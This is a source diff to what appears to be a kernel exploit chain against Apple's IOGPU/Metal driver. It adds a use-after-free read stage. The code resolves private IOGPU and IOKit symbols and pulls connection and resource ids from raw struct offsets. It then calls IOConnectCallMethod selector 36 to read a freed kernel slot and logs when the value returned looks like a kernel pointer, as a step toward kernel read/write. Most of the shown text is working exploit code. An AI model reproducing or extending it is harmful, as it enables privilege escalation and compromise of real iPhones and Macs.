@@ -39,6 +39,8 @@ typedef int      (*p122_replace_t)(void *res, void *page, uint64_t len);
 typedef uint32_t (*p122_gettype_t)(void *res);
 typedef uint32_t (*p122_getconn_t)(void *ref);
 
+typedef kern_return_t (*p122_connectcall_t)(mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, uint32_t, uint64_t *, uint32_t *, void *, uint32_t *);
+static p122_connectcall_t g_connectCall;
 static p122_detach_t   g_detach;
 static p122_replace_t  g_replace;
 static p122_gettype_t  g_getType;
@@ -83,14 +85,14 @@ static NSString *P122Ret(void) {
     g_replace = (p122_replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
     g_getType = (p122_gettype_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
     g_getConn = (p122_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
+    g_connectCall = (p122_connectcall_t)dlsym(iokit, "IOConnectCallMethod");
     p122_log(@"[sym] detach=%p replace=%p getType=%p getConn=%p",
              (void *)g_detach, (void *)g_replace, (void *)g_getType, (void *)g_getConn);
-    if (!g_detach || !g_replace || !g_getType || !g_getConn) {
+    if (!g_detach || !g_replace || !g_getType) {
         p122_log(@"[-] freer dlsym incomplete — stop");
         return P122Ret();
     }
-    (void)iokit;
-
+    
     /* 1 — victim pages + type-0x80 resource (the §1 recipe) */
     id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
     if (!dev) { p122_log(@"[-] no Metal device"); return P122Ret(); }
@@ -105,9 +107,15 @@ static NSString *P122Ret(void) {
     if (!buf) { p122_log(@"[-] bytesNoCopy create failed"); return P122Ret(); }
     void *res = (void *)(uintptr_t)[buf performSelector:@selector(resourceRef)];
     uint32_t ty = res && g_getType ? g_getType(res) : 0;
-    uint32_t conn = res && g_getConn ? g_getConn(res) : 0;
-    p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x (0x80 required, 0x82 = IOSurface path)",
-             page, res, ty, conn);
+    /* v2 ABI law (glue §2): conn = *(u32*)(*(ref+0x10)+0x14); rid = *(u32*)(ref+0x30) */
+    uint32_t conn = 0, rid = 0;
+    if (res) {
+        uint64_t a10 = 0; memcpy(&a10, (uint8_t *)res + 0x10, 8);
+        if (a10) memcpy(&conn, (uint8_t *)(uintptr_t)a10 + 0x14, 4);
+        memcpy(&rid, (uint8_t *)res + 0x30, 4);
+    }
+    p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x rid=0x%x",
+             page, res, ty, conn, rid);
     if (ty != 0x80) {
         p122_log(@"[-] type 0x%x != 0x80 — buffer class miss (honest stop; 0x82 = the create-fail door's job)", ty);
         vm_deallocate(mach_task_self(), (vm_address_t)page, P122_PAGE);
@@ -145,26 +153,32 @@ static NSString *P122Ret(void) {
     }
     p122_log(@"[*] mag churn: %zu live type-0x80 buffers (holder cycle)", (unsigned long)[churn count]);
 
-    /* 4 — the freed-slot read (ColdForge law): post-free deref via our own
-       resource state. The honest reader here = inspect our page's CONTENT
-       after the churn (a reclaim wrote through the freed slot?):
-       0x11 = untouched; 0x43-zone churn = our own pools; FOREIGN = a real
-       occupant. This is a READ-side oracle, not kread. */
-    uint8_t *v = (uint8_t *)page;
-    p122_log(@"[reader] page post-churn: %02x %02x %02x %02x (0x11=intact, else occupant)",
-             v[0], v[1], v[2], v[3]);
-    int nKptr = 0;
-    for (uint64_t off = 0; off + 8 <= P122_PAGE; off += 8) {
-        uint64_t q; memcpy(&q, (uint8_t *)page + off, 8);
-        if ((q >> 36) == 0xfffffff) nKptr++;   /* kernel-pointer shape (glue law) */
-    }
-    p122_log(@"[reader] kernel-shaped qwords in page: %d", nKptr);
-    if (nKptr > 0) {
-        p122_log(@"[+++] SHAPE-1 CANDIDATE: kernel-describing occupant read back via our own page —"
-                 @" the §41 missing piece materialized; board records");
-        [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
-                                   detail:[NSString stringWithFormat:@"shape1-candidate nKptr=%d", nKptr]
-                                   source:@"p122"];
+    /* 4 — the freed-slot read (ColdForge law, the REAL reader): sel36 thunk
+       on the device UC = IOConnectCallMethod(conn, 36, in=[rid, offset, len],
+       1 scalar out). The out-scalar = what lives in the freed slot — the
+       ColdForge 16/16 survivor oracle, now inside the freer chain. */
+    if (conn && rid) {
+        uint64_t outScalar = 0; uint32_t outCnt = 1;
+        uint64_t inS[3] = { rid, 0, 0x1000 };
+        kern_return_t kr36 = g_connectCall
+            ? g_connectCall((mach_port_t)conn, 36, inS, 3, NULL, 0,
+                            &outScalar, &outCnt, NULL, NULL)
+            : 0xe00002cc;
+        p122_log(@"[reader] sel36 kr=0x%x out=0x%llx", kr36, outScalar);
+        if (kr36 == 0) {
+            BOOL kshape = ((outScalar >> 36) == 0xfffffff);
+            p122_log(kshape
+                ? @"[+++] SHAPE-1 CANDIDATE: sel36 out of the freed slot reads a KERNEL-SHAPED value —"
+                  @" the §41 missing piece live; board records"
+                : @"[*] sel36 out = non-kernel-shaped occupant (ColdForge law: survivor, not KRW)");
+            if (kshape) {
+                [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
+                                           detail:[NSString stringWithFormat:@"shape1 sel36 out=0x%llx", outScalar]
+                                           source:@"p122"];
+            }
+        }
+    } else {
+        p122_log(@"[-] conn/rid derivation failed (0x%x/0x%x) — sel36 reader skipped", conn, rid);
     }
 
     /* 5 — the KRW gate verdict (honesty law): */
